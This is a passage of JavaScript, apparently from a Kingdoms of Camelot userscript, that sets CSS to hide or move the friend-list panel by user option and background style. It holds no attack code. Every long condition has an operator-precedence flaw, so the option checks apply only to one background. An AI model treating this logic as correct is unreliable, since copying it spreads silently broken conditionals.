	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;}';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.hideShowKoCBottomStuff==true && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 306px; position: absolute;  top: -60px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==true && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==false && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_list { float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;} .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 37px; position: absolute;  top: 1488px; width: 760px; height: 1px;}  ';}
	if (Options.hideFriends==true && Options.hideKoCBar==false && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none; } .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 306px; position: absolute;  top: -60px; width: 760px; height: 1px;}';}
	if (Options.hideFriends==false && Options.hideKoCBar==false && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
